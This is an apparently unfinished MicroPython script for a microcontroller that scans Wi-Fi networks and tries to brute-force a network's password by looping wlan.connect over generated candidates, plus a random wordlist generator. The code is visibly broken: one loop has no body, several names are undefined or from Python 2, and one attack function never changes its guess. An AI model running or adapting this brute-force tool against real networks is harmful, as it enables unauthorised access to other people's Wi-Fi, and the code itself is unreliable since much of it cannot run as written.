from itertools import chain, product
import network
import time

def do_connect():
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    if not wlan.isconnected():
        print('connecting to network...')
        wlan.connect('', '')
        while not wlan.isconnected():
            pass
    print('network config:', wlan.ifconfig())
    
def my_scan():
    sta_if = network.WLAN(network.STA_IF); sta_if.active(True)
    print(sta_if.scan())
    
def brute(myssid):
    mypass = "10000000"
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    wlan.connect(myssid, mypass)
    while not wlan.isconnected():
        print('Try connecting ...')
#        mypass = mypass + 1
        print(str(mypass))
        wlan.connect(myssid, mypass)
        time.sleep(.01)
    print('pass:', str(mypass)) 
    
def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(1, maxlength + 1)))    
    
def brute2(myssid):
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    for attempt in bruteforce(string.ascii_lowercase, 10):

    your_list = '0123456789abcdefghijklmnopqrstuvwxyz!@$%&'
    complete_list = []
    mypass = '10000000'
    wlan.connect(myssid, mypass)
    time.sleep(.01)
    while not wlan.isconnected():  
        for current in xrange(10):
            a = [i for i in your_list]
            for y in xrange(current):
                a = [x+i for i in your_list for x in a]
            complete_list = complete_list+a
            mypass = str(complete_list)
            wlan.connect(myssid, mypass)
            if wlan.isconnected():
                print("pass:", mypass)
                return
            time.sleep(.01)

def gen1():
    sl = 8  #start length
    ml = 8  #max length 
    ls = '9876543210qwertyuiopasdfghjklzxcvbnm' # list
    g = 0
    tries = 0

    file = open("file.txt",'w') #your file

    for j in range(0,len(ls)**4):
        while sl <= ml:
            i = 0
            while i < sl:
                file.write(choice(ls))
                i += 1
            sl += 1
            file.write('\n')
            g += 1
        sl -= g
        g = 0
        print(tries)
        tries += 1


    file.close()            
            
    